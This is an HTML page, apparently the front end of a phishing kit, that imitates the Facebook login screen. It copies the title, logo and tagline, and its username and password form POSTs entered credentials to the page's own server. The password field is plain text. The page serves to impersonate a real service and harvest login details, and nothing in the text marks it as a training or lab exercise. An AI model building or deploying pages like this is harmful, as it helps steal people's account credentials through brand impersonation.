<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
    <title>Facebook</title>
    <link rel="icon" href="/assets/img/icon.png">
</head>

<body id="hero">
    <div id="main" class="row">
        <div id="brandholder" class="container-fluid col-lg-6 col-md-6"><img id="logo" src="assets/img/Facebook.svg">
            <p id="facebook-paragraph"><br>Facebook helps you connect and share with the people in your life.<br><br></p>
        </div>
        <div class="container-fluid col-lg-6 col-md-6">
            <div id="card-holder">
                <div class="card">
                    <div class="card-body" id="login-card">
                        <form action="/" method="POST">
                            <div class="holder"><input name="username" class="form-control cred-input" type="text" placeholder="Email address or Phone number"></div>
                            <div class="holder"><input name="password" class="form-control cred-input" type="text" placeholder="password"></div>
                            <div class="holder"><button class="btn btn-primary" id="login-button" type="submit">Log In</button></div>
                        </form>
                        <div id="forgot-pass" class="holder"><a href="#">Forgot Password?</a></div>
                        <hr>
                        <div id="create-acc" class="holder"><button class="btn btn-primary btn-success" id="create-acc-but" type="button">Create New Account</button></div>
                    </div>
                </div>
            </div>
            <div class="holder">
                <p><strong>Create a page</strong>&nbsp;for&nbsp;a celebrity, brand or business.<br></p>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/js/bootstrap.bundle.min.js"></script>
</body>

</html>
